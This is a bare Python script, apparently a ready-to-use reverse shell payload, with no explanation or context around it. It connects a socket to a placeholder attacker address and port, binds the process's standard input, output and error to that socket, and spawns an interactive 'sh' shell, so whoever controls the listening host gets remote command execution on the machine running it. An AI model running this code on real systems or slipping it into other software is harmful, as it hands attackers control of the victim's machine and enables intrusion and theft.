import socket,os,pty
def reverse_shell_payload():
    s=socket.socket()
    s.connect(("ATTACKER IP","PORT"))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("sh")
if __name__ == "__main__":
    reverse_shell_payload()